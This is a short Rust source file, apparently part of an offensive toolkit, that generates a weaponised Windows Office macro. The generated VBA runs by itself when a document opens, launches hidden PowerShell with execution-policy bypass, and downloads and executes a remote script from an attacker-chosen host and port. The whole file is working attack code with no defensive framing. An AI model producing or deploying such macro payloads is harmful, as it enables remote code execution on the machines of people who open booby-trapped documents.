// Windows Office Macro payload generator
use crate::cli::banner;

pub struct OfficeMacro;

impl OfficeMacro {
    pub fn new() -> Self { Self }
    
    pub fn generate(&self, lhost: &str, lport: &str) -> String {
        banner::print_exploiting("OFFICE-MACRO", &format!("{}:{}", lhost, lport));
        
        format!(
            r#"Sub AutoOpen()
    Dim str As String
    str = "powershell -nop -w hidden -exec bypass -c " & _
        """IEX (New-Object Net.WebClient).DownloadString('http://{}:{}/payload.ps1')"""
    Shell str, vbHide
End Sub

Sub Document_Open()
    AutoOpen
End Sub"#,
            lhost, lport
        )
    }
}
